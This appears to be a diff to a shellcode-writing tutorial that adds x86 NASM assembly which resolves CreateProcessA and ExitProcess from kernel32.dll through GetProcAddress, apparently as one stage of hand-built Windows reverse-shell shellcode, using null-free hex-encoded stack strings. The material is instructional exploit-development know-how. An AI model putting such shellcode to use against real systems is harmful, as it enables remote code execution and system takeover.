@@ -303,5 +303,36 @@ mov [esi + 0x8], eax ; esi at offset 0x8 will now hold the address of connect
 
 The `connect` function address is now stored at ESI + 0x8 bytes.
 
-We've now safely stored all of our networking functions on the stack. We just need to locate `CreateProcessA` and `ExitProcess` now. Keep in mind these functions are exported from `kernel32.dll` 
+We've now safely stored all of our networking functions on the stack. We just need to locate `CreateProcessA` and `ExitProcess` now. Keep in mind these functions are exported from `kernel32.dll`. The `kernel32.dll` address is still stored inside EBX so on this invocation of `GetProcAddress` you'll see me `push ebx`. 
+
+```nasm
+; use GetProcAddress to get the location of CreateProcessA
+push 0x61614173 
+sub word [esp + 0x2], 0x6161
+push 0x7365636f
+push 0x72506574
+push 0x61657243
+push esp
+push ebx
+call edi
+
+mov [esi + 0xc], eax ; esi at offset 0xc will now hold the address of CreateProcessA
+```
+
+Lastly, we end our function address hunting by finding `ExitProcess`.
+
+```nasm
+; use GetProcAddress to get the location of ExitProcess
+push 0x61737365
+sub dword [esp + 0x3], 0x61
+push 0x636f7250
+push 0x74697845
+push esp
+push ebx
+call edi 
+
+mov [esi + 0x10], eax ; esi at offset 0x10 will now hold the address of ExitProcess
+```
+
+
 
